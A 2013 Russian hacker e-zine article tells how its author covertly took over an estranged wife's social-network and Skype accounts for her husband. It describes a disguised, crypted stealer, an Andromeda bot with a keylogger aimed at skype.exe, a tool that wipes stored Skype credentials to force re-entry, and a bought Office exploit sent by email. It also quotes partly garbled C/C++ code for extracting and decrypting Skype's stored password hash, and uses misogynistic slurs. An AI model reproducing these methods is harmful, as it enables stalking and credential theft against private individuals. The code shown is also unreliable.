<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<META http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<link rel="stylesheet" type="text/css" href="style/style.css">
		<title> История одного взлома </title>
	</head>

	<body>
	<table cellpadding="25" align="center" >
			<tr>
				<td>
					<h2><span class="header">История одного взлома</span></h2>
					<p class="text"><br>
					- Надо написать статейку...<br>
					- Ну напиши: "Жили были дед и бабка..."<br>
					- Нееее. Надо про хакеров.<br>
					- Ну напиши: "Жили были дед и бабка, и были они хакерами..."</p> 
					<p class="text">Поехали. <br>
					Сегодня будем говорить про <span class="warning">взломы.</span><br> 
					Расскажу я, пожалуй, вам одну из своих историй. Итак, обратился ко мне знакомый с просьбой. Мялся, крутился, но в итоге рассказал как есть.
					В общем, дядька в небольшом возрасте нашел молодую жену. Был счастлив и светел, и думал, что только смерть разлучит их. Однако.
В один момент жена из заечки превратилась в суку. И довольно зубатую...
И вместо обещанных детей и сладкой жизни - собрала шмотки и уехала к маме, попутно подав на развод с требованием половины имущества...</p>
					<p class="text">Дядько ловит инфаркт...
Ну и после инфаркта едет ко мне. Говорит что-то не ладно. Должно быть объяснение. Давай посмотрим чего она постоянно в одноклассниках зависает.
Омг. Опять одноклассники... Гребаные социальные развратники. Ну да ладно. Помогать человеку нужно. Начинаем подготовку.</p>
					<p class="text">Объясняю дядьке все варианты, как и что можно сделать. А что мы могли сделать-то? Теоретически - можно было попытаться запулить ей 
					кейлогер или стиллер. Но под каким видом?
С другой стороны, можно было попробовать ретривнуть пасс на мыло. А доступ к мылу попробовать получить через секретный вопрос. 
Дяденька-то жену любил и знал все ее привычки.
Но у двух этих методов был один огромный минус. Благоверная в идеале не должна была ничего узнать о том, что ее поимели. 
И сделать нужно было все скрыто.
Значит ретрив отметался. Оставалось стиллером попытаться утянуть пасс. Любимая-то оперу всю жизнь юзала...</p>

					<p class="text">Был подготовлен и закриптован билд классического <span class="warning">UFR Stealer</span>. Билд вручен дяденьке на флэшке. 
					Билд положен в отдельную папку, а ярлык создан в папку с фотограциями.
Ессно, у ярлыка была иконка jpg картинки из системной библиотеки. И имя !ima3684. Восклицательный - что бы в списке это был первый файл.
Теоретически дяденька должен был попасть к благоверной и отдать ей какие-то семейные фотографии (сентиментальная сучка оказалась...).
Но как всегда - случай - дело великое. Дяденька вдруг вспомнил, что жена заходила в сеть пока его небыло с его бука.
УРА. Запускаем стиллер на буке, и вот он. Долгожданный пасс. Естественно в сохраненных. Или дядька лох и просто не мог посмотреть, или земля квадратная...
Ну да ладно. Оставляю счастливого недохакера читать переписку и ухожу домой...</p>
					
					<p class="text">Через три-четыре дня звонок. Второй инфаркт... Звонок из палаты. Полный ПЭ. 
					Рога с 5-6 ветвлениями, разод и кидок на бабки был спонтанным предложением текущего ебаря.
Дядьку жалко. Нормальный мужик... Ну да ладно. Спрашиваю: "че нужно-то еще?"
Говорит, что читал. Много читал. Пил валерьянки еще больше. Зря коньяк не пил. Валерьянка не помогала...
Нужен скайп. В скайпе основная переписка с тем, кто все продумывал.
Ну скайп так скайп.</p>
					<p class="text">Гуглим/читаем... Плохо дело. Очень плохо. Скайп - это вам не аська и не опера. 
					Оказывается, в скайпе все несколько хуже в плане увода доступа.
Дело в том, что скайп не хранит сам пароль ни в открытом, ни в хэшированном виде. Вернее хранит, но есть беда.
Сам пароль каким-то магическим способом смешивается с ID системы (вероятнее всего винта), 
затем из полученного собирается свой непонятный хэш, и вот эта байда сохраняется в системе.<br>
Читаем <a href="http://www.skypetips.ru/skype_profile.htm" target="_blank">http://www.skypetips.ru/skype_profile.htm</a><br>
Проверяем... профит. Лежит вся эта солянка в файле <span class="warning">"c:\Documents and Settings\user_name\Application Data\Skype\shared.xml"</span>,  
а хэш хранится в <span class="warning">"c:\Documents and Settings\user_name\Application Data\Skype\login_skype\config.xml".</span><br>
Только кое-кто ошибся малость. В этом я убедился, найдя вот этот видос: <br>
<a href="http://www.youtube.com/watch?v=5Z-0x75f1ec" target="_blank">http://www.youtube.com/watch?v=5Z-0x75f1ec</a></p>


					<p class="warning">
					&#8249;Credentials3&#8250;8AA7F687754705A7080A9FA13184D8D5A.........&#8249;/Credentials3&#8250;</p> 


					<p class="text">Вот эта строчка нас и интересует. <br>
					Изначально мой взгляд был привлечен вот этой статьей: <br>
					<a href="http://habrahabr.ru/qa/20561/" target="_blank">http://habrahabr.ru/qa/20561/</a><br><br>
					<span class="warning">[цитата]<br>
					Знаю, что хеш строится так:</span></p>
					
					
					
<pre class="c" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> MD5_Skype_Password <span style="color: #009900;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>username<span style="color: #339933;">,</span> <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>password<span style="color: #339933;">,</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>hash128<span style="color: #009900;">&#41;</span>
<span style="color: #009900;">&#123;</span>
MD5_state skyper <span style="color: #339933;">=</span> MD5_INIT<span style="color: #339933;">;</span>
&nbsp;
MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> username<span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span>u32<span style="color: #009900;">&#41;</span> strlen <span style="color: #009900;">&#40;</span>username<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;nskypern&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">8</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> password<span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span>u32<span style="color: #009900;">&#41;</span> strlen <span style="color: #009900;">&#40;</span>password<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
MD5_end <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
memcpy <span style="color: #009900;">&#40;</span>hash128<span style="color: #339933;">,</span> skyper.<span style="color: #202020;">hash</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">16</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #b1b100;">return</span> <span style="color: #0000dd;">16</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span></pre>



					<p class="text"><br>
					<span class="warning">[/цитата]</span></p>
					
					<p class="text">Но что-то не складывалось. Загуглив далее - обнаружил вот что:</p>
					<ul>
					<li><a href="https://new-crew.net/showthread.php?tid=1328" target="_blank">https://new-crew.net/showthread.php?tid=1328</a></li>
					<li><a href="http://insecurety.net/?p=427" target="_blank">http://insecurety.net/?p=427</a></li>
					</ul>
					
					<p class="text"><br>
					<span class="warning">[цитата]<br>
					To extract the Credentials ciphertext, you could read the contents of config.xml and scan for &#8249;Credentials3&#8250; and &#8249;/Credentials3&#8250;
Here, I’m using LibXML </span></p>



<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #0000ff;">bool</span> GetCredentials<span style="color: #008000;">&#40;</span>BYTE ciphertext<span style="color: #008000;">&#91;</span><span style="color: #008000;">&#93;</span>, std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> config_xml<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>    
    <span style="color: #0000ff;">bool</span> bFound <span style="color: #000080;">=</span> <span style="color: #0000ff;">false</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #666666;">// try open config.xml</span>
    xmlTextReaderPtr reader<span style="color: #008080;">;</span>
    reader <span style="color: #000080;">=</span> xmlReaderForFile<span style="color: #008000;">&#40;</span>config_xml.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000dd;">0</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #666666;">// tested with Credentials2 or Credentials3</span>
    <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>credentials<span style="color: #008080;">;</span> 
    credentials <span style="color: #000080;">=</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> xmlChar<span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #FF0000;">&quot;Credentials&quot;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>reader <span style="color: #000040;">!</span><span style="color: #000080;">=</span> <span style="color: #0000ff;">NULL</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
&nbsp;
      <span style="color: #666666;">// while nodes are available</span>
      <span style="color: #0000ff;">while</span> <span style="color: #008000;">&#40;</span>xmlTextReaderRead<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
        <span style="color: #666666;">// get name</span>
        <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>name<span style="color: #008080;">;</span>
        name <span style="color: #000080;">=</span> xmlTextReaderConstName<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
        <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>name <span style="color: #000080;">==</span> <span style="color: #0000ff;">NULL</span><span style="color: #008000;">&#41;</span> <span style="color: #0000ff;">continue</span><span style="color: #008080;">;</span>
&nbsp;
        <span style="color: #666666;">// equal to credentials we're searching for?</span>
        <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>xmlStrncmp<span style="color: #008000;">&#40;</span>credentials, name, xmlStrlen<span style="color: #008000;">&#40;</span>credentials<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">0</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
&nbsp;
          <span style="color: #666666;">// read the next value</span>
          <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>xmlTextReaderRead<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
            <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>value<span style="color: #008080;">;</span>
            value <span style="color: #000080;">=</span> xmlTextReaderConstValue<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
            <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">int</span> i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">16</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
              <span style="color: #0000dd;">sscanf</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span><span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #000040;">&amp;</span>value, <span style="color: #FF0000;">&quot;%02x&quot;</span>, <span style="color: #000040;">&amp;</span>ciphertext<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
            <span style="color: #008000;">&#125;</span>
            bFound <span style="color: #000080;">=</span> <span style="color: #0000ff;">true</span><span style="color: #008080;">;</span>
            <span style="color: #0000ff;">break</span><span style="color: #008080;">;</span>
          <span style="color: #008000;">&#125;</span>
        <span style="color: #008000;">&#125;</span>
      <span style="color: #008000;">&#125;</span>
      xmlFreeTextReader<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
    xmlCleanupParser<span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">return</span> bFound<span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre>



					<p class="warning"><br>
					Obtain the salt which is passed to SHA-1 before being used to create AES key.</p>
					
					
					
<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;">PBYTE GetSalt<span style="color: #008000;">&#40;</span>DWORD <span style="color: #000040;">&amp;</span>cbSalt<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
    BYTE aBlob<span style="color: #008000;">&#91;</span><span style="color: #0000dd;">2048</span><span style="color: #008000;">&#93;</span><span style="color: #008080;">;</span>
    DWORD cbSize <span style="color: #000080;">=</span> <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>aBlob<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> skype_path<span style="color: #008000;">&#91;</span><span style="color: #008000;">&#93;</span> <span style="color: #000080;">=</span> <span style="color: #FF0000;">&quot;Software\Skype\ProtectedStorage&quot;</span><span style="color: #008080;">;</span>
&nbsp;
    LSTATUS lStatus <span style="color: #000080;">=</span> SHGetValue<span style="color: #008000;">&#40;</span>HKEY_CURRENT_USER, skype_path, 
        <span style="color: #FF0000;">&quot;0&quot;</span>, <span style="color: #0000dd;">0</span>, aBlob, <span style="color: #000040;">&amp;</span>cbSize<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>lStatus <span style="color: #000040;">!</span><span style="color: #000080;">=</span> ERROR_SUCCESS<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;  Unable to open skype key : %08x&quot;</span>, lStatus<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
      <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">NULL</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    DATA_BLOB in, out<span style="color: #008080;">;</span>
&nbsp;
    in.<span style="color: #007788;">pbData</span> <span style="color: #000080;">=</span> aBlob<span style="color: #008080;">;</span>
    in.<span style="color: #007788;">cbData</span> <span style="color: #000080;">=</span> cbSize<span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>CryptUnprotectData<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>in, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000ff;">NULL</span>, 
        <span style="color: #0000ff;">NULL</span>, <span style="color: #0000dd;">0</span>, <span style="color: #000040;">&amp;</span>out<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
      cbSalt <span style="color: #000080;">=</span> out.<span style="color: #007788;">cbData</span><span style="color: #008080;">;</span>
      <span style="color: #0000ff;">return</span> out.<span style="color: #007788;">pbData</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span> <span style="color: #0000ff;">else</span> <span style="color: #008000;">&#123;</span>
      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;  Unable to decrypt skype entry.&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
    <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">NULL</span><span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre>



					<p class="warning"><br>
					Then with both the ciphertext and salt, we can decrypt MD5 hash…</p>
					
					
					
<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #0000ff;">void</span> DecryptHash<span style="color: #008000;">&#40;</span>PBYTE pbCipherText, PBYTE pbSalt, DWORD cbSalt<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
&nbsp;
    SHA_CTX ctx<span style="color: #008080;">;</span>
    AES_KEY key<span style="color: #008080;">;</span>
&nbsp;
    u_int8_t dgst<span style="color: #008000;">&#91;</span><span style="color: #0000dd;">40</span><span style="color: #008000;">&#93;</span>, buffer<span style="color: #008000;">&#91;</span>AES_BLOCK_SIZE<span style="color: #008000;">&#93;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000dd;">memset</span><span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>buffer, <span style="color: #0000dd;">0</span>, <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>buffer<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #666666;">// use counter mode + SHA-1 to generate key</span>
    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span>ULONG i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">2</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
      ULONG ulIndex <span style="color: #000080;">=</span> _byteswap_ulong<span style="color: #008000;">&#40;</span>i<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
      SHA1_Init<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
      SHA1_Update<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx, <span style="color: #000040;">&amp;</span>ulIndex, <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>ulIndex<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
      SHA1_Update<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx, pbSalt, cbSalt<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
      SHA1_Final<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>dgst<span style="color: #008000;">&#91;</span>i<span style="color: #000040;">*</span><span style="color: #0000dd;">20</span><span style="color: #008000;">&#93;</span>, <span style="color: #000040;">&amp;</span>ctx<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
&nbsp;
    AES_set_encrypt_key<span style="color: #008000;">&#40;</span>dgst, <span style="color: #0000dd;">256</span>, <span style="color: #000040;">&amp;</span>key<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    AES_encrypt<span style="color: #008000;">&#40;</span>buffer, buffer, <span style="color: #000040;">&amp;</span>key<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;n  MD5 hash = &quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
&nbsp;
    <span style="color: #666666;">// decrypt MD5 hash with XOR</span>
    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">int</span> i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">16</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;%02x&quot;</span>, pbCipherText <span style="color: #000040;">^</span> buffer<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
    <span style="color: #008000;">&#125;</span>
    <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;n&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
<span style="color: #008000;">&#125;</span></pre>



					<p class="warning"><br>
					[/цитата]</p>
					
					<p class="text">Тут была предпринята попытка расшифровать собственный пароль. Открыл свой конфиг, выдрал строчку... 
					Крутил-вертел. Не выходит изначальная комбинация. Что только не пробовал. 
					Варианты комбинаций, менял местами, брутил... Эффекта не было. Что-то или у меня с руками, или алгоритм был с тех пор изменен.
Долгое гугление не помогло. Строка не поддается расшифровке (я бы хотел обсудить указанные мной ссылки и материалы. 
Может моего кодер-скилла оказалось мало или накосячил где. Хотелось бы в финале получить утилиту, способную делать рекавери пассворда. 
Но времени было не много и нужно было двигаться дальше).
Что же делать-то....</p>
					<p class="text">А делать вот что. Берем андромеду, криптуем, добавляем плаг кейлогера. В кейлогере задаем процесс <span class="warning">skype.exe.</span><br>
					Делаем отдельно маааленький бинарник, который рекурсивно ищет в <span class="warning">"Documents and Settings"</span> все файлы 
					<span class="warning">config.xml</span>, и если в нем есть строка, начинающаяся на <span class="warning">&#8249;Credentials</span> - то данные в ней очищались.
Криптуем и ставим как задание в андромеде. Далее - за определенную сумму денег склеиваем нашу андромеду с doc файлом. 
Продавец гарантировал работу на ограниченном количестве версий офиса...
Отправляем почтой, надеемся, ждем... профит.</p>

					<p class="text">Давайте объясню, что получается:</p>
					<ul>
					<li>изменение либо удаление значения строки <span class="warning">&#8249;Credentials3&#8250;</span> не вызывает ошибки, но заставляет 
					пользователя заново ввести пароль. У скайпа это бывает регулярно. Так что мало кто заморачивается над причиной очередной просьбы скайпа ввести пасс.</li>
					<li>вводимый пасс перехватывается кейлогером и отправляется нам в админку.</li>
					<li>хистори скайп хранит на серваке. И получив доступ к аккаунту можно запросто прочитать хистори.</li>
					<li>пароль, опять же, не был изменен, и жертва ничего не узнала.</li>
					</ul>
					
					<p class="text">Отдаю пасс. Требую свою бутылку коньяка... Оставляю человека погруженным в свои мысли...</p>
					
					<p class="text">Что добавить. Повезло, знали векторы атаки, имели инструмен под рукой, не женитесь пацаны... </p> 
					<p class="text"><br>
					В каждой красивой девушке,<br>
					В каждой застенчивой лапочке,<br>
					Могут быть где-то запрятаны<br>
					Блядские гены пробабушки...<br><br>
					<span class="warning">p.s. </span> коньяк до сих пор жду...
					</p>

<p class="warning"><br>______________________________<br>
Ar3s<br> 
2013<br><br>
Inception E-Zine</p>

				</td>
			</tr>
		</table>
	</body>
</html>